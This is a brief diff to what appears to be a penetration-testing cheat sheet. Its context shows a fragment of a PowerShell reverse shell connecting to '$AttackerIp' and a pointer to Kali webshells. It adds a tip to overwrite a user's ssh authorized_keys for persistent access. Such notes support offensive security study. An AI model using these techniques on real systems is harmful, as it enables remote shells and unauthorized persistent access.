@@ -65,6 +65,8 @@ $client = New-Object System.Net.Sockets.TCPClient('$AttackerIp',$AttackerPort);$
 Beware of simple and double quotes... \
 Webshells on Kali: `/usr/share/webshells`
 
+Overwrite ssh keys in `/home/someuser/.ssh/authorized_keys`
+
 ## Command injection
 
 
